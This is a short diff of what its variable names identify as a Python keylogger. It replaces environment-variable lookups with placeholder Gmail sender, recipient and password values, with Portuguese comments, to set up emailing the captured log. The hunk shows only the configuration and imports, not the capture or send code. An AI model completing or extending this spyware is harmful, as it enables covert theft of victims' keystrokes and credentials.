@@ -4,9 +4,9 @@ from email.mime.text import MIMEText
 from threading import Timer
 import os
 
-EMAIL_ORIGEM = os.getenv('KEYLOGGER_EMAIL')
-EMAIL_DESTINO = os.getenv('KEYLOGGER_EMAIL_DESTINO')
-SENHA_EMAIL = os.getenv('KEYLOGGER_EMAIL_PASSWORD')
+EMAIL_ORIGEM = "seu_email@gmail.com"  # Configure com variáveis de ambiente
+EMAIL_DESTINO = "destino@gmail.com"   # Configure com variáveis de ambiente
+SENHA_EMAIL = "sua_senha"             # Use variáveis de ambiente
 
 log = ""
 
